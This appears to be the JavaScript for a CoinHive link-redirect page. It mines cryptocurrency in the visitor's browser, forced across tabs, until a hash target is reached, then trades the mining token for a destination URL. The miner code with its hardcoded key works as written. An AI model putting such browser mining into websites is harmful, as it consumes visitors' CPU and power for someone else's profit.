if (!window.CoinHive) {
    document.getElementById('blk-warning').style.display = 'block';
}
var $progress = document.getElementById('progress');
var target = 4608;
var totalHashes = 0;
var updateInterval = null;
var miner = new CoinHive.Token('vZN4yBylScted04LzbcSpzgKQGitdSsy', target);
miner.on('accepted', function(params) {
    if (params.hashes >= target) {
        clearInterval(updateInterval);
        $progress.style.width = '100%';
        var ts = Date.now();
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === xhr.DONE) {
                var now = Date.now();
                var url = JSON.parse(xhr.responseText).url;
                if (now - ts < 200) {
                    var wait = 275 - (now - ts);
                    setTimeout(function() {
                        window.location.href = url;
                    }, wait);
                } else {
                    window.location.href = url;
                }
            }
        };
        xhr.open('POST', '/1e8eg');
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.send('token=' + encodeURIComponent(miner.getToken()));
    }
});
updateInterval = setInterval(function() {
    var p = miner.getTotalHashes(true) / target;
    var progress = (p * p) / (p * p + 0.2) + 0.01;
    $progress.style.width = (Math.ceil(progress * 1000) / 10) + '%';
}, 250);
miner.start(CoinHive.FORCE_MULTI_TAB);